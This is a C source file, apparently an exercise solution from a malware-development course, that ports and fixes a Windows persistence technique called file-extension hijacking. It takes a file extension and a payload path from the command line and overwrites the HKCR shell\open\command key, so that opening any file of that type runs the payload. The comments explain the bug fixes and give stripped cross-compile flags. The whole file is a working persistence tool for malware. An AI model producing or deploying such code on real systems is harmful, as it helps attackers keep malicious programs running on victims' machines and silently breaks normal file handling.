/*
 * exercise 6 solution
 * persistence: file-extension hijacking - pure C port, bug fix, argv
 * hack6.c
 * author: @cocomelonc
 *
 * base: 10-file-extension/pers.cpp
 *
 * three changes vs original:
 *
 * change 1 - bug fix: leading backslash in registry path
 *   original: RegOpenKeyEx(HKEY_CLASSES_ROOT,
 *                          "\\txtfile\\shell\\open\\command", ...)
 *   problem:  HKCR paths must NOT start with a separator.
 *             The leading "\\" causes RegOpenKeyEx to look for a key
 *             literally named "" (empty string) under HKCR, which
 *             fails with ERROR_FILE_NOT_FOUND on all modern Windows.
 *   fix:      "txtfile\\shell\\open\\command"  (no leading backslash)
 *
 * change 2 - RegOpenKeyEx -> RegCreateKeyEx
 *   the shell\open\command key for a given file type usually exists,
 *   but using RegCreateKeyEx is defensive: it works even when the key
 *   is absent (e.g. for a freshly registered or uncommon extension).
 *
 * change 3 - command-line arguments
 *   argv[1] = file extension WITHOUT the dot, e.g. "txt", "py", "docx"
 *   argv[2] = full path to the payload executable
 *   the key is built dynamically: <ext>file\shell\open\command
 *   (Windows maps .txt -> txtfile, .py -> Python.File or py_auto_file,
 *    etc.; for custom extensions the student may need to check HKCR
 *    first to find the ProgID.)
 *
 * usage:
 *   hack6.exe txt  "C:\Windows\System32\calc.exe"
 *   hack6.exe py   "C:\Windows\System32\calc.exe"
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-gcc hack6.c -o hack6.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 */
#include <windows.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
  HKEY  hkey = NULL;
  DWORD disposition = 0;
  char  keypath[512];

  /* ── argument handling ──────────────────────────────────────────── */
  if (argc < 3) {
    printf("usage: hack6.exe <extension> <payload_path>\n");
    printf("  extension    file type without dot, e.g.: txt  py  docx\n");
    printf("  payload_path full path to evil exe,  e.g.: C:\\evil.exe\n");
    printf("\nexamples:\n");
    printf("  hack6.exe txt  \"C:\\Windows\\System32\\calc.exe\"\n");
    printf("  hack6.exe py   \"C:\\Windows\\System32\\calc.exe\"\n");
    return 1;
  }

  const char *ext     = argv[1];   /* e.g. "txt"           */
  const char *payload = argv[2];   /* e.g. "C:\evil.exe"   */

  /*
   * exercise 6 change 3: build the key path dynamically from argv.
   *
   * convention: HKCR maps ".txt" -> "txtfile", ".py" -> "Python.File"
   * (varies by Python install), etc.  for the common case we append
   * "file" to the extension to form the ProgID.
   *
   * original (hardcoded, buggy):
   *   "\\txtfile\\shell\\open\\command"   ← wrong leading backslash
   *
   * updated:
   *   "<ext>file\\shell\\open\\command"   ← no leading backslash
   */
  snprintf(keypath, sizeof(keypath),
           "%sfile\\shell\\open\\command", ext);

  printf("[*] target key: HKCR\\%s\n", keypath);
  printf("[*] payload:    %s\n", payload);

  /*
   * exercise 6 change 2: RegCreateKeyEx instead of RegOpenKeyEx.
   * creates the full key path if any component doesn't exist yet.
   */
  LONG res = RegCreateKeyEx(
    HKEY_CLASSES_ROOT,
    keypath,
    0, NULL,
    REG_OPTION_NON_VOLATILE,
    KEY_WRITE,
    NULL, &hkey, &disposition
  );
  if (res != ERROR_SUCCESS) {
    printf("[-] RegCreateKeyEx failed: %ld\n", GetLastError());
    printf("    (tip: HKCR writes need admin rights on modern Windows)\n");
    return 1;
  }

  if (disposition == REG_CREATED_NEW_KEY) {
    printf("[*] key created (was not present)\n");
  } else {
    printf("[*] key opened  (already existed)\n");
  }

  /*
   * write the default value ("") of the open\command key.
   * Windows uses this string as the command line when opening a file
   * of this type.  the original payload path replaces the existing
   * "C:\Windows\system32\NOTEPAD.EXE %1" or similar.
   */
  res = RegSetValueEx(hkey, "", 0, REG_SZ,
                      (const BYTE*)payload,
                      (DWORD)(strlen(payload) + 1));
  RegCloseKey(hkey);

  if (res != ERROR_SUCCESS) {
    printf("[-] RegSetValueEx failed: %ld\n", GetLastError());
    return 1;
  }

  printf("[+] file extension hijack installed\n");
  printf("    opening any .%s file will now launch: %s\n", ext, payload);
  return 0;
}
